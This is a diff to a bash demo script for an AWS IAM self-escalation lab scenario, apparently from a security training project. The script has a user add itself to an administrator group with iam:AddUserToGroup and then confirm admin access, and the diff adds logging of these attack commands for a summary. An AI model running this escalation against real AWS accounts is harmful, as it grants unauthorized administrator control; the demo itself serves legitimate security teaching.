@@ -3,7 +3,6 @@
 # Demo script for iam:AddUserToGroup self-escalation
 # This is a USER-BASED self-escalation scenario
 
-set -e
 
 # Disable AWS CLI paging
 export AWS_PAGER=""
@@ -13,6 +12,24 @@ RED='\033[0;31m'
 GREEN='\033[0;32m'
 YELLOW='\033[1;33m'
 NC='\033[0m' # No Color
+
+# Dim color for command display
+DIM='\033[2m'
+CYAN='\033[0;36m'
+
+# Track attack commands for summary
+ATTACK_COMMANDS=()
+
+# Display a command before executing it
+show_cmd() {
+    echo -e "${DIM}\$ $*${NC}"
+}
+
+# Display AND record an attack command
+show_attack_cmd() {
+    echo -e "\n${CYAN}\$ $*${NC}"
+    ATTACK_COMMANDS+=("$*")
+}
 
 # Configuration
 START_USER="pl-prod-iam-013-to-admin-user"
@@ -51,6 +68,7 @@ cd - > /dev/null  # Return to scenario directory
 
 # Step 2: Verify identity as pl-prod-iam-013-to-admin-user
 echo -e "${YELLOW}Step 2: Verifying identity as $START_USER${NC}"
+show_cmd "aws sts get-caller-identity --query 'Arn' --output text"
 USER_IDENTITY=$(aws sts get-caller-identity --query 'Arn' --output text)
 echo "Current identity: $USER_IDENTITY"
 
@@ -59,12 +77,14 @@ if [[ ! $USER_IDENTITY == *"$START_USER"* ]]; then
     exit 1
 fi
 
+show_cmd "aws sts get-caller-identity --query 'Account' --output text"
 ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
 echo "Account ID: $ACCOUNT_ID"
 echo -e "${GREEN}✓ Confirmed identity as $START_USER${NC}\n"
 
 # Step 3: Check current group memberships
 echo -e "${YELLOW}Step 3: Checking current group memberships for $START_USER${NC}"
+show_cmd "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
 CURRENT_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
 if [ -z "$CURRENT_GROUPS" ]; then
     echo "Current groups: None"
@@ -81,6 +101,7 @@ echo ""
 # Step 4: Check current permissions (should be limited)
 echo -e "${YELLOW}Step 4: Checking current permissions (should be limited)${NC}"
 echo "Attempting to list IAM users (should fail if not in admin group)..."
+show_cmd "aws iam list-users --max-items 1"
 if aws iam list-users --max-items 1 &> /dev/null; then
     echo -e "${YELLOW}⚠ User already has admin permissions${NC}"
     echo "This may be because the user is already in the admin group from a previous run"
@@ -96,6 +117,7 @@ echo "$START_USER is adding themselves to $ADMIN_GROUP"
 echo ""
 
 # Add user to admin group
+show_attack_cmd "aws iam add-user-to-group --group-name $ADMIN_GROUP --user-name $START_USER"
 aws iam add-user-to-group \
     --group-name $ADMIN_GROUP \
     --user-name $START_USER
@@ -116,6 +138,7 @@ sleep 15
 echo "Testing admin permissions (listing IAM users)..."
 SUCCESS=false
 for i in {1..3}; do
+    show_cmd "aws iam list-users --max-items 3 --output table"
     if aws iam list-users --max-items 3 --output table 2>/dev/null; then
         echo -e "${GREEN}✓ Successfully listed IAM users!${NC}"
         echo -e "${GREEN}✓ Confirmed administrator access through group membership!${NC}\n"
@@ -136,6 +159,7 @@ fi
 
 # Verify group membership
 echo -e "\n${YELLOW}Verifying group membership:${NC}"
+show_cmd "aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text"
 UPDATED_GROUPS=$(aws iam list-groups-for-user --user-name $START_USER --query 'Groups[*].GroupName' --output text)
 echo "Current groups: $UPDATED_GROUPS"
 
@@ -155,6 +179,15 @@ echo -e "  Adds self to $ADMIN_GROUP"
 echo -e "    ↓ (group membership + AdministratorAccess policy)"
 echo -e "  $START_USER gains Administrator Access"
 echo ""
+
+if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
+    echo -e "${YELLOW}Attack Commands:${NC}"
+    for cmd in "${ATTACK_COMMANDS[@]}"; do
+        echo -e "  ${CYAN}\$ ${cmd}${NC}"
+    done
+    echo ""
+fi
+
 echo -e "${YELLOW}Key Insight:${NC}"
 echo "This is a self-escalation attack where a user with iam:AddUserToGroup permission"
 echo "on an administrative group can add themselves to that group, immediately gaining"
